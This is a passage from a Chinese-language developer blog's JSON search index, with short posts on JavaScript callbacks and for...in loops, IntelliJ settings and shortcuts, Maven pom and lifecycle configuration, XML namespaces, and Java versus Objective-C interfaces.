理解了回调后的正确方式（也不知道理解对没有）由于JS的传递参数过程是一个复制的过程，我们只需要把函数的地址作为参数传入，至于函数本身的参数，并不需要关心，正确的代码 123456789var statusUtil &#x3D; &#123; response:function(response) &#123; alert(response.message) &#125;, sign:function() &#123; $.post(url,&#123;&quot;id&quot;:10&#125;,this.response,&quot;json&quot;) &#125;, ....&#125; Ajax并发在查询共用一个回调函数时，还发现JQuery存在一个when…done…函数 12345678910var url1 &#x3D; &quot;&#x2F;resource&#x2F;ar&#x2F;hometab&#x2F;index_tab_games.json&quot;var url2 &#x3D; &quot;&#x2F;resource&#x2F;ar&#x2F;hometab&#x2F;index_tab_image.json&quot;var ajax1 &#x3D; $.ajax(&#123;url : url1&#125;)var ajax2 &#x3D; $.ajax(&#123;url : url2&#125;) $.when(ajax1, ajax2).done(function()&#123; alert(&quot;done&quot;); &#125;).fail(function()&#123; alert(&quot;fail&quot;); &#125;); 该函数是并发多个Ajax请求，然后等待接收到所有返回后才会触发回调函数，根据别人总结 使用$.when()的方式会等到两个请求都返回之后才触发回调函数 只有当两个请求都成功返回时才会触发done回调","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"Ajax","slug":"Ajax","permalink":"http://yoursite.com/tags/Ajax/"},{"name":"JQuery","slug":"JQuery","permalink":"http://yoursite.com/tags/JQuery/"}]},{"title":"JS的for...in...","date":"2016-06-30T15:00:02.000Z","path":"2016/07/01/JS的forin/","text":"JS中的for…in…在Java或者OC中，大家都会使用遍历方法for…in…，一般用于操作List或者NSArray，今天在操作JS的时候遇到了一个坑 123456789var array &#x3D; new Array()array.push(&quot;value01&quot;)array.push(&quot;value02&quot;)array.push(&quot;value03&quot;)for (var temp in array) &#123; console.log(temp)&#125; 该代码打印出来的结果是 1234012 发现 temp并不是array里的value而是其index 需要修改为 123for (var temp in array) &#123; console.log(array[temp])&#125; 产生的原因之所以会产生这种情况，是因为JS本身的Object结构的问题 123456var object &#x3D; &#123; &quot;key01&quot;:&quot;value01&quot;, &quot;key02&quot;:&quot;value02&quot;, &quot;key03&quot;:&quot;value03&quot;, ...&#125; Object作为根本对象，其储存方式都是Key－Value键值对的形式，所以说Array这种Object，只不过自动把Key设置成0，1，2…，而JS的for…in…循环，只能遍历Object的key对象，这种性质带与Java等不同的是，JS默认可以对任何类型进行遍历，而不仅仅是List。 12345var dict &#x3D; &#123;&quot;key01&quot;: 5,&quot;key02&quot;: 10, &quot;key03&quot;: 20&#125;for (var temp in dict) &#123; console.log(temp)&#125; 输出 1234key01key02key03 甚至对方法名进行遍历 1234567891011var obj &#x3D; &#123; inVar01: 5, inVar02: 10, inVar03: function()&#123; &#x2F;&#x2F;do &#125;&#125;for (var temp in obj) &#123; console.log(temp)&#125; 输出 123inVar01inVar02inVar03","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"JS中的传值和传址","date":"2016-06-30T15:00:01.000Z","path":"2016/07/01/JS中的传值和传址/","text":"JS中的传值和传址疑问的来源在JS的函数传入参数的时候，在函数内部改变参数的值，结果不同 12345678910111213141516function test() &#123; var num &#x3D; 5 var obj &#x3D; new Object() obj.num &#x3D; 5 doIntTest(num) doObjTest(obj) alert(&quot;int: &quot; + num+&quot; obj: &quot;+obj.num)&#125;function doIntTest(param) &#123; param &#x3D; 10&#125;function doObjTest(param) &#123; param.num &#x3D; 10&#125; 以上代码测试结果为 1int: 5 obj: 10 为什么呢？ JS中的varJS中的对象分为两种 基本对象： 储存的为具体的值 引用对象： 储存的为某个地址 其中引用对象中储存的地址既可以是Object对象的地址，也可以是某个函数的地址，所以才能有以下代码 1var a &#x3D; function()&#123;&#x2F;&#x2F;do&#125;; 传参的本质根据JavaScript高级程序设计中68-72页介绍，JS函数的传参实质上是一种拷贝，有点类似于我的文章深拷贝与浅拷贝中的讨论,如果函数**function doTest(param)**存在参数，那么 param 本身是一个var，会对传入的var的内容进行复制 1234567891011function doIntTest(param) &#123; &#x2F;&#x2F;param对num对内容5进行了复制，这里param函数内部的临时变量 &#x2F;&#x2F;这里对param进行修改，不会影响到外部变量 param &#x3D; 10&#125;function doObjTest(param) &#123; &#x2F;&#x2F;param对obj的的内容——obj自身的地址 进行了复制 &#x2F;&#x2F;由于外部的obj和内部的param内容都为obj自身的地址，通过该地址.num修改对象，影响到了外部变量 param.num &#x3D; 10&#125;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"JS的回调函数的坑坑坑","date":"2016-06-30T15:00:00.000Z","path":"2016/07/01/JS的回调函数的坑坑坑/","text":"如何声明一个回调函数注意在传入回调函数的时候使用的是 someCall 函数名，而不是 someCall() ,在JS中 () 代表作为函数执行的意思，并不是该函数的指针 12345678910111213function test() &#123; doWithCallBack(someCall)&#125;function doWithCallBack(callback) &#123; console.log(&quot;Enter&quot;) callback()&#125;function someCall() &#123; console.log(&quot;CallBack&quot;)&#125; 输出 12EnterCallBack 如果使用了刚刚提到的后者会提示错误 TypeError: callback is not a function. (In ‘callback()’, ‘callback’ is undefined) 并且从输出日志可以看到 someCall() 首先作为函数被执行了一次，才进入doWithCallBack 12CallBackEnter JS使用范型带来的隐患因为回调函数传入的是一个函数名，如果传入一个var或者null，岂不是会报错，影响后续执行？所以说可以进行一次typeof检查来保证代码不错出 1(callback &amp;&amp; typeof(callback) &#x3D;&#x3D;&#x3D; &quot;function&quot;) &amp;&amp; callback();","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"intelliJ在Mac中文输入法下CpasLock无法小写","date":"2016-03-25T15:00:00.000Z","path":"2016/03/26/IntelliJ在Mac中文输入法下CpasLock无法小写/","text":"intelliJ在Mac中文输入法下CpasLock无法小写我比较喜欢用Mac自带的中文输入法，也习惯了使用CpasLock锁定英文和汉字，但是IDEA这个做的明显是有BUG，一旦按下了CpasLock就无法小写，这尼玛坑爹，搜索了2天终于找到了一个比较妥当的解决方案 为了更广泛的传播出去，我这里再重复一遍 Seil关键都是这个键盘映射软件，简直是良心啊，不仅小巧轻便，而且看不到任何多余的东西官方网站和GitHub地址,我在访问的时候感觉比较卡，可能需要翻墙，下载完成后 打开系统偏好设置－键盘－键盘－修饰键，将Caps Lock键设为“无操作” 下载Seil后将Caps Lock键映射为Key Code 80（或者其他一个不存在的键，80代表F19） 打开系统偏好设置－键盘－快捷键－输入源，将切换到上一个输入法的快捷键设置为F19（通过选择后按一下Caps Lock） 这样的就可以从以往的「中文输入法－英文状态」到「中文输入法-中文状态」之间的切换，变成了「中文输入法」与「英文输入法」之间的切换。 IMLight关于使用Seil后CapsLock按键不发光，解决方案里的作者还自己写了个小程序，Github地址，但是我感觉无所谓，而且状态栏会多个图标，不开森。","tags":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"IntelliJ文件编码设置成UTF8","date":"2016-03-25T15:00:00.000Z","path":"2016/03/26/IntelliJ文件编码设置成UTF8/","text":"IntelliJ文件设置成UTF8写这篇文章的初衷是又一次往数据库里写String，不管怎么写进去都是乱码，后来发现是因为IntelliJ本身的文件在执行和操作的时候不是UT8的编码，特此记录一下 在 「Preference」——「Editor」——「File Encodings」 里可以对当前工程设置 在 「File」——「Other Setting」——「File Encodings」 里可以对IDE的默认设置进行更改","tags":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"IntelliJ注释和常用快捷键","date":"2016-03-25T15:00:00.000Z","path":"2016/03/26/IntelliJ注释和常用快捷键/","text":"关于注释以前在Xcode的时候都是用VVDocument来进行写注释，到了IntelliJ才知道VVDocument是抄的Java的注释方式。 输入「/」 输入两个星号「**」 输入回车键Enter 常用快捷键实现Implement或者Override Control＋I 或者 Control＋O 实现构造函数或者Getter和Setter Control＋Enter 大小写切换 选中文字 Shift＋Command＋U 对Class重命名 Shift＋F6 有时候需要加上Fn如果你的F键是功能键 收起代码Fold Shift＋Command＋减号 打开最近文件 Command＋E 高级检索 Shift＋Command＋F 快速打开文件 Shift＋Command＋O 选中代码(IntelliJ的下触摸板选中代码实在是难用) Shift+方向键 可以配合Option和Command 实现Serializable协议时自动生成ID 需要配合插件GenerateSerialVersionUID然后使用 ALT＋Enter就会生成设计好的「serialVersionUID」","tags":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"IntelliJ的服务器容器配置以及Target移动问题","date":"2016-03-25T15:00:00.000Z","path":"2016/03/26/IntelliJ的容器配置以及Target移动问题/","text":"IntelliJ的容器配置在IntelliJ的菜单栏中央，可以配置Run/Debug想要生成的Target 其中就包含所谓的服务器容器，常见的服务器容器是Tomcat，还有一种最近比较流行的叫Jetty 点开配置，可以看到该页面叫 Run/Debug Configurations 遵循以下步骤 点击左上角加号 选择某种容器Tomcat或者Jetty 选择容器所在的目录 修正一些错误(一般是要部署的war包没有设定) 不同容器Target的不同在文章WebServlet的工作原理中我们讲到，所谓一个Web网站实质是服务器容器webapps下的某一个war文件，那么在我们执行Run/Debug时生成的Target目标才是我们的网站，那么IntelliJ对这些目标做了什么处理呢？ 如果采用的是Tomcat容器Tomcat容器的情况下，你的结构目录和资源都会被原封不动的拷贝到Tomcat/webapps下 如果采用的是Jetty容器而Jetty容器的情况下，Jetty/webapps下不会被拷贝任何文件(我也不知道为什么)","tags":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"Java命令打包H5的Project成War包","date":"2016-03-25T15:00:00.000Z","path":"2016/03/26/Java命令打包H5的Project成War包/","text":"Java命令打包H5的Project成War包除了在IDE中可以通过Maven，或者WepApp这种Java工程生成为War包的Target之外，还可以直接对前端的工程文件用Java命令进行打包 12jar cvf path&#x2F;target.war &#x2F;project－path 在cvf命令后第一个是你War包要生成的路径，第二个是你工程的路径","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"HTML","slug":"HTML","permalink":"http://yoursite.com/tags/HTML/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"}]},{"title":"XML文件中一堆网址是什么(写服务端一定要先看这个)","date":"2016-03-25T15:00:00.000Z","path":"2016/03/26/XML文件中一堆网址是什么/","text":"XML的学习XML是一种标记性语言，学习教程哪里都有，今天我们要讨论的新手的疑惑Spring前那一大段是啥。 这个是web.xml配置文件1234567&lt;web-app xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;javaee&quot; xmlns:web&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_3_0.xsd&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_3_0.xsd&quot; id&#x3D;&quot;WebApp_ID&quot; version&#x3D;&quot;3.0&quot;&gt;&lt;&#x2F;web-app&gt; 这个是Spring的配置文件123456789&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-4.0.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context.xsd&quot; default-lazy-init&#x3D;&quot;true&quot;&gt;&lt;&#x2F;beans&gt; xmlns在配置文件中，出现最多的就是这个字符，其含义是「XML Name Space」，作用和C＋＋的命名空间是一样的，比如context这个单词太常用了 A在自己的XML标签里写了context B在自己的XML标签里也写了context 如果我使用了AB那么用的是谁的呢？ 这个时候就可以通过「xmlns:context = “URL”」来规定用的是谁的 比如在Spring的配置文件里就把URL指向了一个Spring的地址 URL记不住怎么办URL一般不用记住，如果是在IntelliJ里写XML，IDE会自动给你添加上这个xmlns，就像import package一样。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"}]},{"title":"pom文件配置冲突造成打包重复","date":"2016-03-25T15:00:00.000Z","path":"2016/03/26/pom文件配置冲突造成打包重复/","text":"Maven下有多个Modules在写一个工程的时候，Project下有一个pom文件，每个modules下也有自己的pom文件，在「web层」这个module下的pom文件是从网上拷贝来的，里面附带里一个plugin 123456789101112131415161718192021&lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt; &lt;artifactId&gt;maven-war-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;2.6&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;!--&lt;outputDirectory&gt;$&#123;basedir&#125;&#x2F;..&#x2F;target&lt;&#x2F;outputDirectory&gt;--&gt; &lt;warName&gt;$&#123;project.build.finalName&#125;&lt;&#x2F;warName&gt; &lt;webResources&gt; &lt;resource&gt; &lt;directory&gt;$&#123;basedir&#125;&#x2F;src&#x2F;main&#x2F;webapp&#x2F;pages&lt;&#x2F;directory&gt; &lt;filtering&gt;true&lt;&#x2F;filtering&gt; &lt;&#x2F;resource&gt; &lt;&#x2F;webResources&gt; &lt;archive&gt; &lt;addMavenDescriptor&gt;false&lt;&#x2F;addMavenDescriptor&gt; &lt;&#x2F;archive&gt; &lt;&#x2F;configuration&gt; &lt;&#x2F;plugin&gt;&lt;&#x2F;plugins&gt; 这段代码造成每次打包target的war包的时候，除了web根目录下有一套Resource，在「/pages/」这个目录下也有一套Resource，删掉就好了。 原因是因为这个插件就是个打包War包的插件，看名字「maven-war-plugin」","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"}]},{"title":"Java和OC中的数据容器和数组","date":"2016-03-24T15:00:00.000Z","path":"2016/03/25/Java和OC中的数据容器和数组/","text":"Java和OC中的数据容器和数组在文章List/Set/Map的区别里我们讨论了Java的数据容器，由于其面向接口的编程特性，让我回忆了一下OC里面的「NSArray」和「NSMutableArray」,于是打开Xcode看了看定义 什么是数据容器先说数据容器和数组的区别 在数组实例化时，长度必须时确定的，而且不具备增加或者删除元素的方法。 而数据容器就是实现了动态的数组，具有统一的增加或删除元素的逻辑，内存不确定，由容器自动来管理内存。 Xcode中的定义现在来看看Cocoa里的定义，原来Mutable是继承于不可变的一个子类 @interface NSArray&lt;__covariant ObjectType&gt; : NSObject &lt;NSCopying, NSMutableCopying, NSSecureCoding, NSFastEnumeration&gt; @end @interface NSMutableArray&lt;ObjectType&gt; : NSArray&lt;ObjectType&gt; @end 其中有个 @protocol NSFastEnumeration - (NSUInteger)countByEnumeratingWithState:(NSFastEnumerationState *)state objects:(id __unsafe_unretained [])buffer count:(NSUInteger)len; @end 感觉看上去很像Java的「public interface Iterator」接口啊，看起来是个快速枚举方法 在使用上的区别感觉在Java里的数组对应就是不可变NSArray，只不过NSArray其实是个数据容器，虽然不可变，但是可以填充任何Object。 而Java的数据容器，对应着NSMutable的数据容器，而且比起来OC有更具体的实现方法 Apple大法好虽然我觉得Java功能更强大，但是在直接使用上新用户会比较迷茫和麻烦，还是Apple总结的好，搓逼你就用Array就好了，算法都由我们高端的Engineer来实现，你不用关心。感觉就和iPhone一样，千万不要买小米！！","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"Maven的本质和使用","date":"2016-03-24T15:00:00.000Z","path":"2016/03/25/Maven的本质和使用/","text":"Maven是什么在WebGoat的学习笔记里我们提到过Maven，其作用是包管理软件，当真实的接触到Java工程的时候，发现包管理只是其一个功能。 为什么需要Maven开发包的载入写程序的都知道，都是面向Copy编程，能用轮子就用轮子，不要自己作死去造轮子，有很多吊毛非觉得大家都用的轮子不够圆，然后自己造个方的。。。。 所以说写程序需要别人现成的代码，但是别人怎么给你呢。。。总不能粘贴复制然后QQ发给你吧。。。所以就会打包成开发包发给你。。。 以下列举常见的开发包,开发包和「平台」以及「语言」都有关系，这里只是举例不一定正确 Windows Linux MacOS C++ lib/dll a/so a/framework Java jar/so jar/so jar/so OC - - a/framework 如何加载开发包在有Maven这种包管理之前，都是在本地建立一个文件夹，一般起名叫做「lib」然后把各种库放在里面，然后从IDE里指定『Path』路径到这个文件夹，例如文章Xcode和IntelliJ加载开发包中的举例。 而Maven所做的工作，『就是把网络上一个地址映射到你本地一个地址』然后使用一个『坐标』的概念拼接出来这个路径。其实质就是一个本地文件夹和云盘的同步 Maven的本质解析Maven的中央仓库地址: http://central.maven.org/maven2/ 这个就是Maven在网络上的中央仓库，说白了就是个文件夹，里面存了所有在Maven上发布的Jar包 Maven的本地仓库本地仓库的地址可以从你IDE或者Maven的设置里看到，比如IntelliJ的本地仓库地址 可以看到红色标记处，就是你本地的文件夹 地址:/Users/Apple/.m2/repository Maven的仓库映射在配置好了本地仓库之后，就需要使用pom.xml配置文件了，这个文件就是 确定了你要下载哪些Jar包到本地 每次修改pom文件后，Maven就回自动去中央仓库下载，然后加入到你工程的「Project Struct」——「Library」配置里，使用的是本地仓库的路径，如下图 Maven的pom.xml文件配置文件的解析Maven的配置文件是个xml文件，其具体有什么标签，代表什么意思，可以去Maven的官方网站文档查询，这里做简单的解释。 12345678910111213141516171819&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot; http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;maven-v4_0_0.xsd &quot;&gt; &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt; &lt;groupId&gt;坐标组&lt;&#x2F;groupId&gt; &lt;artifactId&gt;坐标名&lt;&#x2F;artifactId&gt; &lt;version&gt;坐标版本号&lt;&#x2F;version&gt; &lt;packaging&gt;Target格式&lt;&#x2F;packaging&gt; &lt;dependencies&gt;需要加载哪些Jar包&lt;&#x2F;dependencies&gt; &lt;build&gt;编译和生成Target目录&lt;&#x2F;build&gt;&lt;&#x2F;project&gt; project节点： 该节点代表一个工程或者是一个模块，是pom文件的最外层节点，其下有9个基本节点 坐标节点：指的是「groupId」「artifactId」「version」这三个节点，定义了目录信息 packaging节点：项目编译后打包成Target时生成的格式 dependencies节点： 重点的重点！规定了Project要加载哪些Jar包 build节点：编译打包生成相关配置 dependencies与坐标在上一节里提到，「dependencies」决定了我要使用Maven加载哪些Jar，而里面就是使用坐标这个信息来确定Jar包的，例如 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;坐标组&lt;&#x2F;groupId&gt; &lt;artifactId&gt;坐标名&lt;&#x2F;artifactId&gt; &lt;version&gt;坐标版本号&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; .... &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-core&lt;&#x2F;artifactId&gt; &lt;version&gt;4.1.9.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 坐标的实质在加载完Pom文件之后，更新一下，待到更新成功，我们去看看Maven到底怎么实现了云盘功能 此处一定要让pom文件加载成功，不然在本地仓库可能找不到对应文件，因为没下载成功 映射和坐标Maven的整个工作流程就是把路径信息分解成了 「仓库」＋「坐标」，如果再仔细点 Library Path 仓库 groupId artifactId version 中央仓库 http://central.maven.org/maven2/ org/springframework/ spring-core/ 4.1.9.RELEASE 本地仓库 /Users/Apple/.m2/repository org/springframework/ spring-core/ 4.1.9.RELEASE 我来组成头部在刚刚提到了Maven有两个仓库「本地仓库」和「中央仓库」，此时你可以按照以下步骤看一下 打开浏览器输入中央仓库地址: http://central.maven.org/maven2/ 打开本地文件夹地址，比如我的是Mac的： /Users/Apple/.m2/repository 浏览器里看到了一堆文件夹名，本地也看到了一堆文件夹名 我来组成裤裆 先看坐标的「groupId」例如Spring的 org.springframework 在浏览器和本地都找到org文件夹进入 然后在/org/文件夹里找到springframework文件夹同时进入 再来看「artifactId」，从/org/springframework/目录里找到spring-core同时进入 是不是看到一堆版本号，然后看「version」坐标，找到「4.1.9.RELEASE」这个文件夹进入 是不是在中央仓库的网站和你本地仓库都看到了相同的文件 所以说！ 三个坐标加起来其实就是文件目录 Maven的其它功能Maven除了包管理之外，还可以进「编译」「发布」等等功能，以及Pom文件中和其相关的「build」等标签，这些会在Maven的生命周期简单解释中详细说。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Maven","slug":"Maven","permalink":"http://yoursite.com/tags/Maven/"}]},{"title":"Maven的生命周期简单解释","date":"2016-03-24T15:00:00.000Z","path":"2016/03/25/Maven的生命周期简单解释/","text":"Maven的生命周期在文章Maven的本质和使用中我们讨论了Maven最常用的包管理功能，其实Maven的功能还包括了例如 Maven LifeCircle 对应功能 Xcode的对应 clean 清空工程 菜单栏Product——Clean validate 呃。。不知道干啥的 (￣▽￣) compile 编译 菜单栏Product——Build test 运行测试类 好像Xcode7.2里加入了UITest package 打包生成Target 菜单栏Product——Build verify 这个单词和validate不是一个意思么？ (´･_･`) install 把Target安装到本地仓库 (・ω・)ノ site 呃，不太了解和deploy的区别 (￣3￣) deploy 发布到远程仓库 ( ´ ▽ ` )ﾉ 和工程相关的可见Maven有一些功能还可以控制Project的工程编译和运行，但是像Xcode就把compile和package两个过程合并成了一个build，就像Maven的pom文件里也是这么叫的。 和Maven包发布相关的如果你写了一个Jar包就自己用，打包完成后使用install就可以安装到本地仓库，下一次就可以通过Maven的坐标取到它了，在文章Maven的本质和使用的pom介绍里，「project」节点下有个和「dependencies」节点等级相同的三个坐标节点就是你「install」和「deploy」要生成的对应坐标或者说路径。而「packaging」节点就是你要打包成的格式 关于那几个不太了解的根据这两篇blog 深入理解maven及应用–转 向maven中央仓库提交jar 描述 validatevalidate the project is correct and all necessary information is available. 验证所有组件是否存在且有效 verifyrun any checks to verify the package is valid and meets quality criteria. 执行检查验证打包结果是否符合质量标准 site 建立友好站点，方便与别人协作 因为往中央仓库提交Jar包是要经过审核的，开发者是可以建立一个自己「私有的远程仓库」，供公司内部协作使用，所以可能和建立私有仓库有关。 Maven的配置文件在Maven的本质和使用中我们看到Maven配置的地方，除了本地仓库路径之外，还有一个配置文件，其中可以配置不同的远程仓库，具体需要去官方查文档，这里我有一份从别人那里要来简单的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;settings xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;settings&#x2F;1.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;SETTINGS&#x2F;1.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;settings-1.0.0.xsd&quot;&gt; &lt;servers&gt; &lt;!-- 这里是配置服务器的登陆帐号和密码 --&gt; &lt;server&gt; &lt;id&gt;tboss-site-server&lt;&#x2F;id&gt; &lt;username&gt;pamirs&lt;&#x2F;username&gt; &lt;password&gt;pamirs&lt;&#x2F;password&gt;&lt;&#x2F;server&gt; &lt;&#x2F;servers&gt; &lt;profiles&gt; &lt;!-- 这里是不同的配置文件 --&gt; &lt;profile&gt; &lt;!-- 这个配置文件好像是淘宝的 --&gt; &lt;id&gt;taobao&lt;&#x2F;id&gt; &lt;repositories&gt; &lt;!-- 可以配置多个仓库 --&gt; &lt;!-- 第一个仓库 --&gt; &lt;repository&gt; &lt;id&gt;m2&lt;&#x2F;id&gt; &lt;name&gt;m2 mirror&lt;&#x2F;name&gt; &lt;layout&gt;default&lt;&#x2F;layout&gt; &lt;url&gt;http:&#x2F;&#x2F;repo1.maven.org&#x2F;maven2&lt;&#x2F;url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;&#x2F;enabled&gt;&lt;&#x2F;snapshots&gt; &lt;&#x2F;repository&gt; &lt;!-- 第二个仓库 --&gt; &lt;repository&gt; &lt;id&gt;central&lt;&#x2F;id&gt; &lt;url&gt;http:&#x2F;&#x2F;mvnrepo.taobao.ali.com&#x2F;mvn&#x2F;repository&lt;&#x2F;url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;&#x2F;enabled&gt;&lt;&#x2F;releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;&#x2F;enabled&gt;&lt;&#x2F;snapshots&gt; &lt;&#x2F;repository&gt; &lt;&#x2F;repositories&gt; &lt;&#x2F;profile&gt; &lt;&#x2F;profiles&gt; &lt;activeProfiles&gt; &lt;!-- 可以根据配置文件的id启动不同的配置 --&gt; &lt;activeProfile&gt;dev&lt;&#x2F;activeProfile&gt;&lt;&#x2F;activeProfiles&gt; &lt;&#x2F;settings&gt;&lt;&#x2F;settings&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Maven","slug":"Maven","permalink":"http://yoursite.com/tags/Maven/"}]},{"title":"Xcode和IntelliJ加载开发包","date":"2016-03-24T15:00:00.000Z","path":"2016/03/25/Xcode和IntelliJ加载开发包/","text":"在本地加载开发包虽然现在有了包管理工具，但是想起学生时代不会用包管理工具的时候，光是配环境就要纠结死了，记得当时还给师弟师妹们写过一个如何在Visual Studio里配置OpenCV，记得Visual Studio还要配置三个东西「头文件」「静态库」「动态库」，当时简直被搞定欲仙欲死。后来听说C++里面大家都用Cmake，哎当时也没人教我。 最近写了一个关于Maven的文章，因为Maven实在是比Cocoapods难太多了，顺便记录下怎么在本地加载开发包，虽然我们有了包管理工具，但是其实包管理工具也是通过命令行帮我们在本地实现了配置 IntelliJ 加载Jar包打开工程「File」——「Project Structure」——「Library」可以管理本地的包 点击Library子窗体的左上角「＋」 然后可以选择目录「Directories」或者Jar包文件「Libraries」 选择一个Jar包后，该Jar包就被引入工程了 Xcode 加载头文件和静态库从文章Maven的本质和使用说到Apple一般使用「.a」静态库或者「framework」，其中「.a」静态库需要头文件，所以可以在工程的Build里设置路径Path，注意Xcode会给你隐藏一部分Build设置，记得在左上角从「Basic」切换到「All」或者使用搜索框。","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"Java和OC中Interface/Implement/Protocol","date":"2016-03-23T15:00:00.000Z","path":"2016/03/24/Java和OC中InterfaceImplementProtocol/","text":"Java和Objective-CiOS中有个概念「Protocol」，好多教科书或者Blog都说是Java中的接口，当时我看到的时候，只有C++的经验，心想尼玛接口是什么。。。。 后来学习Java的时候接触到一个概念「面向接口编程」，接口(Interface)这个单词怎么看着这么眼熟呢？原来OC的头文件里就是这个词啊。。 //Java的java文件 public interface BaseObject &#123;&#125; //OC的Head文件 @interface BaseObject : NSObject @end 虽然两个都称作「Interface」但是功能范围完全不一样，但是总体都遵循了一个思想『面向接口编程』 **定论:**功能上来讲 Java的Interface ＝ OC的Interface ＋ OC的Protocol Interface不同的概念多实现和单实现具体的过程请参面向对象语言的吹逼, Java的Interface本身就是一个类，所以接口与接口之间可以进行继承，且一个接口可以有多个实现 Objective-C的的Interface也是一个类，但是一个接口只能有一个实现 所以才说两种语言都是一种「面向接口编程」的语言，你可以拿一个接口指向一个实现，并对其进行操作。 //Java //定义了一个List接口且继承于另外一个Collection接口 public interface List&lt;E&gt; extends Collection&lt;E&gt; &#123;&#125; //定义了一个类实现了List接口 public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, Serializable &#123;&#125; //拿一个接口指向一个实例化 List list = new ArrayList&lt;&gt;(); //Objective-C //定义了一个BaseObject接口(其实是个类) @interface BaseObject : NSObject @end //实现了BaseObject接口 @implementation BaseObject @end //拿一个接口(类定义)指向一个实例化 BaseObject *baseObject = [[BaseObject alloc]init]; 